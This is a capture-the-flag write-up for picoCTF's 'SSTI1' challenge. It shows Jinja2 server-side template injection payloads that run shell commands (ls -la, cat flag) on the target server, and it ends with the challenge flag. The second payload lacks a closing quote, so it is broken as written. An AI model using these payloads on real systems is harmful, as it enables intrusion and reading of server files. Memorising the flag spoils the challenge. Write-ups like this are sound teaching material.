# SSTI1

by RGX

## Steps
1. Launch instance, wait, and open the website
2. I tried to input different payloads to know which SSTI1 can be injected. Then I found this payload code can be use to inject.
```
{{7*7}}
```
![Screenshot (2072)](https://github.com/user-attachments/assets/81e37bc9-748b-4722-81b1-eeedef455b8d)

---------------------------

The output
![Screenshot (2073)](https://github.com/user-attachments/assets/8ebe1224-6e53-4deb-9a5b-b5bc3a538f24)

---------------------------

3. So it seems it is using Jinja2 or other similar engines for python. Then I used this payload to see the directory of the website.
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read() }}
```

The output
![Screenshot (2074)](https://github.com/user-attachments/assets/a45aab43-7539-42ef-91ac-906e30bf20b3)

---------------------------

4. From the `ls -la` command, there is a file named "flag" so I just opened it with a SSTI payload.

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag).read() }}
```

The output
![image](https://github.com/user-attachments/assets/e35ddb42-b8af-4797-98ef-8c6b17884d82)


5. So I've found the flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}
```
